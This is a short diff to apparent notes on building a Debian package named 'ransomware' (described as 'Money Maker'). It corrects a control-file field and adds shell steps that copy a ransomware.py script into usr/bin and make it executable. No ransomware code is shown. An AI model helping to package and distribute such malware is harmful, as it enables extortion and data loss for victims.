@@ -5,7 +5,7 @@ vi ransomware-0.0.1/DEBIAN/control
 add text:
 Package: ransomware
 Version: 0.0.1
-Archetecture: all
+Architecture: all
 Maintainer: Anonymous <anon@proton.me>
 Description: Money Maker
 
@@ -21,3 +21,7 @@ Exec=ransomware
 Icon=
 Terminal=false
 Categories=Languages;Python;
+
+cp ex2/ransomware.py ransomwar-0.0.1/usr/bin/ransomware
+cd ransomwar-0.0.1/usr/bin/
+sudo chmod +x ransomware 
